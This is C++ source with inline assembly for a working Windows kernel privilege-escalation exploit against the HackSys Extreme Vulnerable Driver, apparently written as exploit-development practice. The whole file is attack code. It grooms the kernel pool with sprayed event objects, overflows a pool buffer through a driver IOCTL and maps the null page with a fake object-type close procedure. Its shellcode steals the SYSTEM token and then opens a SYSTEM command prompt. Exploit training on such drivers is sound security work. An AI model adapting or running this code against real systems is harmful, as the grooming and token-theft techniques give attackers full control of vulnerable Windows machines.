#define _CRT_SECURE_NO_WARNINGS 0
#include <iostream>
#include <Windows.h>
#include <Psapi.h>

typedef  NTSTATUS(*pNtAllocateVirtualMemory)(
	HANDLE    ProcessHandle,
	PVOID     *BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
	);
void pwn() {
	__asm {
		pushad
		xor eax, eax
		mov eax, fs:[eax + 124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4
	SearchSystemPID :
			mov eax, [eax + 0b8h]
			sub eax, 0b8h
			cmp[eax + 0b4h], edx
			jne SearchSystemPID
		mov edx, [eax + 0f8h]
		mov[ecx + 0f8h], edx
		popad
	}
}

static void cmd() {
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) {
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

HANDLE eventArrs[0x1000] = { NULL };
void pool_spray() {
	std::cout << "[+] Spraying event object\n";
	for (int i = 0; i < 0x1000; i++) {
		eventArrs[i] = CreateEventA(NULL, FALSE, FALSE, NULL);
		if (!eventArrs[i]) {
			for (int k = 0; k < i; k++) {
				CloseHandle(eventArrs[k]);
			}
			std::cout << "[x] Failed to spray evnet\n";
			exit(-1);
		}
	}
	std::cout << "[+] Freeing some event object to construct gap\n";
	for (int i = 0; i < 0x1000; i++) {
		for (int j = 0; j < 8; j++) {
			if (i + j < 0x1000) {
				CloseHandle(eventArrs[i + j]);
			}
		}
		i += 8;
	}
}

void get_zero_page() {
	const char *dll_name = "ntdll.dll";
	HMODULE dll = LoadLibraryA(dll_name);
	if (dll == NULL) {
		std::cout << "Failed to load dll\n";
		exit(-1);
	}
	pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(dll, "NtAllocateVirtualMemory");
	if (NtAllocateVirtualMemory == NULL) {
		std::cout << "Failed to get address of NtAllocateVirtualMemory\n";
		exit(-1);
	}
	printf("[+] NtAllocateVirtualMemory address: %#x\n", (DWORD)NtAllocateVirtualMemory);

	PVOID zeroBase = (PVOID)1;
	SIZE_T regionSize = 0x1000;
	NTSTATUS status = NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, &zeroBase, 0, &regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (status != 0) { // || zeroBase != NULL) {
		printf("[x] not zeroBase: %#x\n", (DWORD)zeroBase);
		std::cout << "[x] Failed to NtAllocateVirtualMemory Zero Base\n";
		exit(-1);
	}
}

int main()
{
	std::cout << "[+] BufferOverflowNonPagedPool!\n";
	DWORD retLength = 0;
	DWORD inBuffer[0x300] = { 0 };
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (!hDevice) {
		std::cout << "[x] Failed to create driver file\n";
		return -1;
	}

	memset(inBuffer, 'C', sizeof(inBuffer));
	/*
		85ead840  04080040 ee657645 00000000 00000040
		85ead850  00000000 00000000 00000001 00000001
		85ead860  00000000 0008000c
	*/

	inBuffer[0x1f8 / 4 + 0] = 0x04080040;
	inBuffer[0x1f8 / 4 + 1] = 0xee657645;
	inBuffer[0x1f8 / 4 + 2] = 0x00000000;
	inBuffer[0x1f8 / 4 + 3] = 0x00000040;
	inBuffer[0x1f8 / 4 + 4] = 0x00000000;
	inBuffer[0x1f8 / 4 + 5] = 0x00000000;
	inBuffer[0x1f8 / 4 + 6] = 0x00000001;
	inBuffer[0x1f8 / 4 + 7] = 0x00000001;
	inBuffer[0x1f8 / 4 + 8] = 0x00000000;
	inBuffer[0x1f8 / 4 + 9] = 0x00080000;

	//	get_zero_page();
	//	*(DWORD*)(0x60) = (DWORD)&pwn;
	//	printf("[+] CloseProcedure address: %#x\n", *(DWORD*)(0x60));
	pool_spray();
	std::cout << "[+] Change the TypeIndex to zero\n";
	int status = DeviceIoControl(hDevice, 0x22200F, (LPVOID)inBuffer, 0x1f8 + 0x28, NULL, 0, &retLength, NULL);
	if (status == 0) {
		std::cout << "[+] Failed to trigger vuln\n";
		return -1;
	}

	std::cout << "[+] Fakeing _OBJECT_TYPE in zero page\n";
	get_zero_page();
	*(DWORD*)(0x60) = (DWORD)&pwn;
	// Debug
	// DeviceIoControl(hDevice, 0x22200F, (LPVOID)inBuffer, 0x1f, NULL, 0, &retLength, NULL);

	std::cout << "[+] Execute shellcode......\n";
	for (int i = 8; i < 0x1000; i += 9) {
		CloseHandle(eventArrs[i]);
	}
	cmd();
	//	system("pause");
	std::cout << "[+] EXP NERVER END\n";
	return 0;
}
